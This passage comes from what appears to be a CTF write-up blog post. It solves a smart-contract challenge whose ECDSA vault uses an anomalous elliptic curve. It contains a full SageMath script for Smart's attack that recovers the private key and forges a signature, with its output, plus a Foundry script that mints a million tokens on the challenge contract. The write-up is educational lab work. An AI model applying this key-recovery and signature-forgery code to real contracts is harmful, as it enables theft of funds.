</span></code></pre><p>The <code>sInv</code> is computed using <code>mod n</code>. <code>u1(x1, y1)</code> and <code>u2(x1, y1)</code> are also computed over <code>mod n</code> and suprisingly we didn't got <code>n</code> value from the protocol. So, something is fishy...<p><code>n</code> is the order of the curve. We can compute this by doing the following.<p>\[ Ep = EllipticCurve(GF(p), [a,b]) \]<p>\[ n = Ep.order()\]<p>\[ n = 4007911249843509079694969957202343357280666055654537667969\]<p>Interesting, \[ p == n \]<p>These kind of ECC curves are called as <strong>Anomalous Curves</strong>. It is easy to solve the ECDLP in linear time when the underlying elliptic curve is anomalous, i.e. when the number of rational points on <code>Fp</code> is equal to the prime number <code>p</code>. There was a research paper named <a href=https://www.monnerat.info/publications/anomalous.pdf>Generating Anomalous Elliptic Curves</a> published on how to do this. This paper explained an attack called <strong>Smart</strong> to solve ECDLP of Anomalous Curves.<p>So, now with the <strong>Smart</strong> attack we can compute the Private key from the given values. So, once the we compute the Private Key we need to generate the <code>message</code> which we are going to sign and pass to the <code>mint</code> function.<p><code>bytes32 message = keccak256(abi.encode(player, 1_000_000 ether));</code><p>Now we need to sign the above message with the computed private key and pass the signature to <code>mint()</code> function. That's all.<p>Python script to perform <strong>Smart Attack</strong><div class=note-container><button class=note-toggle><div class=note-icon><p>fall.py</div></button><div class=note-content style=display:block><pre class=language-python data-lang=python style=color:#61676c;background-color:#fafafa><code class=language-python data-lang=python><span style=color:#abb0b6;font-style:italic># https://mslc.ctf.su/wp/polictf-2012-crypto-500/
</span><span style=color:#abb0b6;font-style:italic># https://ctftime.org/writeup/29700
</span><span style=color:#abb0b6;font-style:italic># https://giacomopope.com/hsctf-2019/#spooky-ecc
</span><span>
</span><span>p </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>4007911249843509079694969957202343357280666055654537667969
</span><span>q </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>2</span><span style=color:#ed9366>*</span><span>p </span><span style=color:#ed9366>+ </span><span style=color:#ff8f40>1
</span><span>a </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>479674765111403080798288599752794621357071126054239970719 
</span><span>b </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>1839890679886286542886449861618094502587090720247817035647
</span><span>
</span><span>Ep </span><span style=color:#ed9366>= </span><span style=color:#f29718>EllipticCurve</span><span>(</span><span style=color:#f29718>GF</span><span>(p)</span><span style=color:#61676ccc>, </span><span>[a</span><span style=color:#61676ccc>,</span><span>b])
</span><span>G </span><span style=color:#ed9366>= </span><span style=color:#f29718>Ep</span><span>(</span><span style=color:#ff8f40>741691539696267564005241324344676638704819822626281227364</span><span style=color:#61676ccc>,</span><span style=color:#ff8f40>3102360199939373249439960210926161310269296148717758328237</span><span>)
</span><span>Q </span><span style=color:#ed9366>= </span><span style=color:#f29718>Ep</span><span>(</span><span style=color:#ff8f40>228372021298333142209829245091882548944496316312635232236</span><span style=color:#61676ccc>,</span><span style=color:#ff8f40>3693481507636668030082911526987394375826206080991036294396</span><span>)
</span><span>
</span><span>n </span><span style=color:#ed9366>= </span><span>Ep</span><span style=color:#ed9366>.</span><span style=color:#f29718>order</span><span>()
</span><span>Fn </span><span style=color:#ed9366>= </span><span style=color:#f29718>FiniteField</span><span>(n)
</span><span>
</span><span>m </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>19666107331951626476415026567086342074650612991336538073686539593437448590271
</span><span>
</span><span style=color:#fa6e32>def </span><span style=color:#f29718>SmartAttack</span><span>(</span><span style=color:#ff8f40>P</span><span style=color:#61676ccc>,</span><span style=color:#ff8f40>Q</span><span style=color:#61676ccc>,</span><span style=color:#ff8f40>p</span><span>):
</span><span>    E </span><span style=color:#ed9366>= </span><span>P</span><span style=color:#ed9366>.</span><span style=color:#f29718>curve</span><span>()
</span><span>    Eqp </span><span style=color:#ed9366>= </span><span style=color:#f29718>EllipticCurve</span><span>(</span><span style=color:#f29718>Qp</span><span>(p</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>2</span><span>)</span><span style=color:#61676ccc>, </span><span>[ </span><span style=color:#f29718>ZZ</span><span>(t) </span><span style=color:#ed9366>+ </span><span style=color:#f29718>randint</span><span>(</span><span style=color:#ff8f40>0</span><span style=color:#61676ccc>,</span><span>p)</span><span style=color:#ed9366>*</span><span>p </span><span style=color:#fa6e32>for </span><span>t </span><span style=color:#fa6e32>in </span><span>E</span><span style=color:#ed9366>.</span><span style=color:#f29718>a_invariants</span><span>() ])
</span><span>
</span><span>    P_Qps </span><span style=color:#ed9366>= </span><span>Eqp</span><span style=color:#ed9366>.</span><span style=color:#f29718>lift_x</span><span>(</span><span style=color:#f29718>ZZ</span><span>(P</span><span style=color:#ed9366>.</span><span style=color:#f29718>xy</span><span>()[</span><span style=color:#ff8f40>0</span><span>])</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>all</span><span style=color:#ed9366>=</span><span style=color:#ff8f40>True</span><span>)
</span><span>    </span><span style=color:#fa6e32>for </span><span>P_Qp </span><span style=color:#fa6e32>in </span><span>P_Qps:
</span><span>        </span><span style=color:#fa6e32>if </span><span style=color:#f29718>GF</span><span>(p)(P_Qp</span><span style=color:#ed9366>.</span><span style=color:#f29718>xy</span><span>()[</span><span style=color:#ff8f40>1</span><span>]) </span><span style=color:#ed9366>== </span><span>P</span><span style=color:#ed9366>.</span><span style=color:#f29718>xy</span><span>()[</span><span style=color:#ff8f40>1</span><span>]:
</span><span>            </span><span style=color:#fa6e32>break
</span><span>
</span><span>    Q_Qps </span><span style=color:#ed9366>= </span><span>Eqp</span><span style=color:#ed9366>.</span><span style=color:#f29718>lift_x</span><span>(</span><span style=color:#f29718>ZZ</span><span>(Q</span><span style=color:#ed9366>.</span><span style=color:#f29718>xy</span><span>()[</span><span style=color:#ff8f40>0</span><span>])</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>all</span><span style=color:#ed9366>=</span><span style=color:#ff8f40>True</span><span>)
</span><span>    </span><span style=color:#fa6e32>for </span><span>Q_Qp </span><span style=color:#fa6e32>in </span><span>Q_Qps:
</span><span>        </span><span style=color:#fa6e32>if </span><span style=color:#f29718>GF</span><span>(p)(Q_Qp</span><span style=color:#ed9366>.</span><span style=color:#f29718>xy</span><span>()[</span><span style=color:#ff8f40>1</span><span>]) </span><span style=color:#ed9366>== </span><span>Q</span><span style=color:#ed9366>.</span><span style=color:#f29718>xy</span><span>()[</span><span style=color:#ff8f40>1</span><span>]:
</span><span>            </span><span style=color:#fa6e32>break
</span><span>
</span><span>    p_times_P </span><span style=color:#ed9366>= </span><span>p</span><span style=color:#ed9366>*</span><span>P_Qp
</span><span>    p_times_Q </span><span style=color:#ed9366>= </span><span>p</span><span style=color:#ed9366>*</span><span>Q_Qp
</span><span>
</span><span>    x_P,y_P </span><span style=color:#ed9366>= </span><span>p_times_P</span><span style=color:#ed9366>.</span><span style=color:#f29718>xy</span><span>()
</span><span>    x_Q,y_Q </span><span style=color:#ed9366>= </span><span>p_times_Q</span><span style=color:#ed9366>.</span><span style=color:#f29718>xy</span><span>()
</span><span>
</span><span>    phi_P </span><span style=color:#ed9366>= -</span><span>(x_P</span><span style=color:#ed9366>/</span><span>y_P)
</span><span>    phi_Q </span><span style=color:#ed9366>= -</span><span>(x_Q</span><span style=color:#ed9366>/</span><span>y_Q)
</span><span>    k </span><span style=color:#ed9366>= </span><span>phi_Q</span><span style=color:#ed9366>/</span><span>phi_P
</span><span>    </span><span style=color:#fa6e32>return </span><span style=color:#f29718>ZZ</span><span>(k)
</span><span>
</span><span style=color:#fa6e32>def </span><span style=color:#f29718>ecdsa_sign</span><span>(</span><span style=color:#ff8f40>d</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>m</span><span>):
</span><span>  r </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0
</span><span>  s </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0
</span><span>  </span><span style=color:#fa6e32>while </span><span>s </span><span style=color:#ed9366>== </span><span style=color:#ff8f40>0</span><span>:
</span><span>    k </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>1
</span><span>    </span><span style=color:#fa6e32>while </span><span>r </span><span style=color:#ed9366>== </span><span style=color:#ff8f40>0</span><span>:
</span><span>      k </span><span style=color:#ed9366>= </span><span style=color:#f29718>randint</span><span>(</span><span style=color:#ff8f40>1</span><span style=color:#61676ccc>, </span><span>n </span><span style=color:#ed9366>- </span><span style=color:#ff8f40>1</span><span>)
</span><span>      Q </span><span style=color:#ed9366>= </span><span>k </span><span style=color:#ed9366>* </span><span>G
</span><span>      (x1</span><span style=color:#61676ccc>, </span><span>y1) </span><span style=color:#ed9366>= </span><span>Q</span><span style=color:#ed9366>.</span><span style=color:#f29718>xy</span><span>()
</span><span>      r </span><span style=color:#ed9366>= </span><span style=color:#f29718>Fn</span><span>(x1)
</span><span>    e </span><span style=color:#ed9366>= </span><span>m
</span><span>    s </span><span style=color:#ed9366>= </span><span style=color:#f29718>Fn</span><span>(k) </span><span style=color:#ed9366>^ </span><span>(</span><span style=color:#ed9366>-</span><span style=color:#ff8f40>1</span><span>) </span><span style=color:#ed9366>* </span><span>(e </span><span style=color:#ed9366>+ </span><span>d </span><span style=color:#ed9366>* </span><span>r)
</span><span>  </span><span style=color:#fa6e32>return </span><span>[r</span><span style=color:#61676ccc>, </span><span>s]
</span><span>
</span><span style=color:#fa6e32>def </span><span style=color:#f29718>ecdsa_verify</span><span>(</span><span style=color:#ff8f40>Q</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>m</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>r</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>s</span><span>):
</span><span>  e </span><span style=color:#ed9366>= </span><span>m
</span><span>  w </span><span style=color:#ed9366>= </span><span>s </span><span style=color:#ed9366>^ </span><span>(</span><span style=color:#ed9366>-</span><span style=color:#ff8f40>1</span><span>)
</span><span>  u1 </span><span style=color:#ed9366>= </span><span>(e </span><span style=color:#ed9366>* </span><span>w)
</span><span>  u2 </span><span style=color:#ed9366>= </span><span>(r </span><span style=color:#ed9366>* </span><span>w)
</span><span>  P1 </span><span style=color:#ed9366>= </span><span style=color:#f29718>Integer</span><span>(u1) </span><span style=color:#ed9366>* </span><span>G
</span><span>  P2 </span><span style=color:#ed9366>= </span><span style=color:#f29718>Integer</span><span>(u2) </span><span style=color:#ed9366>* </span><span>Q
</span><span>  X </span><span style=color:#ed9366>= </span><span>P1 </span><span style=color:#ed9366>+ </span><span>P2
</span><span>  (x</span><span style=color:#61676ccc>, </span><span>y) </span><span style=color:#ed9366>= </span><span>X</span><span style=color:#ed9366>.</span><span style=color:#f29718>xy</span><span>()
</span><span>  v </span><span style=color:#ed9366>= </span><span style=color:#f29718>Fn</span><span>(x)
</span><span>  </span><span style=color:#fa6e32>return </span><span>v </span><span style=color:#ed9366>== </span><span>r
</span><span>
</span><span>d </span><span style=color:#ed9366>= </span><span style=color:#f29718>SmartAttack</span><span>(G</span><span style=color:#61676ccc>,</span><span>Q</span><span style=color:#61676ccc>,</span><span>p)
</span><span>
</span><span>[r</span><span style=color:#61676ccc>, </span><span>s] </span><span style=color:#ed9366>= </span><span style=color:#f29718>ecdsa_sign</span><span>(d</span><span style=color:#61676ccc>, </span><span>m)
</span><span>result </span><span style=color:#ed9366>= </span><span style=color:#f29718>ecdsa_verify</span><span>(Q</span><span style=color:#61676ccc>, </span><span>m</span><span style=color:#61676ccc>, </span><span>r</span><span style=color:#61676ccc>, </span><span>s)
</span><span>
</span><span style=color:#f07171>print </span><span>(</span><span style=color:#fa6e32>f</span><span style=color:#86b300>"Message: </span><span>{m}</span><span style=color:#86b300>"</span><span>)
</span><span style=color:#f07171>print </span><span>(</span><span style=color:#fa6e32>f</span><span style=color:#86b300>"Public Key: </span><span>{Q</span><span style=color:#ed9366>.</span><span style=color:#f29718>xy</span><span>()}</span><span style=color:#86b300>"</span><span>)
</span><span style=color:#f07171>print </span><span>(</span><span style=color:#fa6e32>f</span><span style=color:#86b300>"Private Key: </span><span>{d}</span><span style=color:#86b300>"</span><span>)
</span><span>
</span><span style=color:#f07171>print </span><span>(</span><span style=color:#86b300>"=== Signature ==="</span><span>)
</span><span style=color:#f07171>print </span><span>(</span><span style=color:#fa6e32>f</span><span style=color:#86b300>" r = </span><span>{r}</span><span style=color:#86b300>"</span><span>)
</span><span style=color:#f07171>print </span><span>(</span><span style=color:#fa6e32>f</span><span style=color:#86b300>" s = </span><span>{s}</span><span style=color:#86b300>"</span><span>)
</span><span style=color:#f07171>print </span><span>(</span><span style=color:#fa6e32>f</span><span style=color:#86b300>"Verification: </span><span>{result}</span><span style=color:#86b300>"</span><span>)
</span><span>
</span><span style=color:#abb0b6;font-style:italic># Message: 19666107331951626476415026567086342074650612991336538073686539593437448590271
</span><span style=color:#abb0b6;font-style:italic># Public Key: (228372021298333142209829245091882548944496316312635232236, 3693481507636668030082911526987394375826206080991036294396)
</span><span style=color:#abb0b6;font-style:italic># Private Key: 2590225047465443722024386469461634294729219346156883417670
</span><span style=color:#abb0b6;font-style:italic># === Signature ===
</span><span style=color:#abb0b6;font-style:italic>#  r = 2195097151127120065579326181785367043581509779126357541128
</span><span style=color:#abb0b6;font-style:italic>#  s = 928540552076520879873320608471470817377985074596666122262
</span><span style=color:#abb0b6;font-style:italic># Verification: True
</span></code></pre></div></div><p>Solidity script to call <code>mint()</code>.<div class=note-container><button class=note-toggle><div class=note-icon><p>Fallout.s.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^0.8.0;
</span><span>
</span><span>import "forge-std/Script.sol";
</span><span>import "forge-std/console.sol";
</span><span>
</span><span>import "../src/Fallout.sol";
</span><span>
</span><span>contract FalloutSolve is Script {
</span><span>    Fallout public fallout = Fallout(0xf96C8C1685180b9551f86952992baAA220E7C91C);
</span><span>    Vault public vault = fallout.vault();
</span><span>    address player = vm.envAddress("PLAYER");
</span><span>    function run() external{
</span><span>        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
</span><span>        console.log("Fallout : ", address(fallout));
</span><span>        console.log("Vault : ", address(vault));
</span><span>        uint256 qx = fallout.Qx();
</span><span>        uint256 qy = fallout.Qy();
</span><span>        uint256  a = vault.a();
</span><span>        uint256  b = vault.b();
</span><span>        uint256  gx = vault.gx();
</span><span>        uint256  gy = vault.gy();
</span><span>        uint256  p = vault.p();
</span><span>        uint256 n = 4007911249843509079694969957202343357280666055654537667969; // n = Ep.order()
</span><span>        console.log("Qx = ", qx);
</span><span>        console.log("Qy = ", qy);
</span><span>        console.log("a = ", a);
</span><span>        console.log("b = ", b);
</span><span>        console.log("gx = ", gx);
</span><span>        console.log("gy = ", gy);
</span><span>        console.log("p = ", p);
</span><span>        console.log("n = ", n);
</span><span>        console.log("isSolved() : ", fallout.isSolved());
</span><span>        bytes32 hash = keccak256(abi.encode(player, 1_000_000 ether));
</span><span>        console.logBytes32(hash);
</span><span>        uint256[2] memory rs = [uint256(2195097151127120065579326181785367043581509779126357541128), 928540552076520879873320608471470817377985074596666122262];
</span><span>        fallout.mint(player, 1_000_000 ether, rs);
</span><span>        console.log("isSolved() : ", fallout.isSolved());   
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=chef><a aria-label="Anchor link for: chef" class=zola-anchor href=#chef>Chef</a></h1><p>I learned Huff programming just to solve this challenge. This challenge deserves a dedicated blog, read it here : <a href=https://themj0ln1r.github.io/posts/learn-huff-with-ctf>Learn Huff by solving a CTF challenge</a><hr><p>Kudos to you for sticking with me till the end and hope you've learned something from this.<h2 id=references><a aria-label="Anchor link for: references" class=zola-anchor href=#references>References</a></h2><ol><li><a href=https://blog.trailofbits.com/2018/09/05/contract-upgrade-anti-patterns/>Anti Proxy Patterns</a><li><a href=https://www.cyfrin.io/blog/price-oracle-manipulation-attacks-with-examples>Oracle Manipulation</a><li><a href=https://mixbytes.io/blog/uniswap-v3-ticks-dive-into-concentrated-liquidity>Uniswap V3 Concentrated Liquidity</a><li><a href=https://rdi.berkeley.edu/berkeley-defi/assets/material/COMPRESSED%20Oracle%20Lecture%E2%80%94DeFi%20course.pdf>Oracles</a><li><a href=https://rdi.berkeley.edu/berkeley-defi/assets/material/Lecture%207%20Introduction%20Slides.pdf>Stable Coins</a><li><a href=https://docs.curve.fi/stableswap-exchange/stableswap-ng/pools/metapool/#remove_liquidity>CurveStableSwapNG Metapool Docs</a><li><a href=https://cryptobook.nakov.com/asymmetric-key-ciphers/elliptic-curve-cryptography-ecc>Elliptic Curve For Developers</a><li><a href=https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/>ECDSA Handle with care</a><li><a href=https://www.monnerat.info/publications/anomalous.pdf>Generating Anomalous Elliptic Curves</a></ol></section></article></main></div>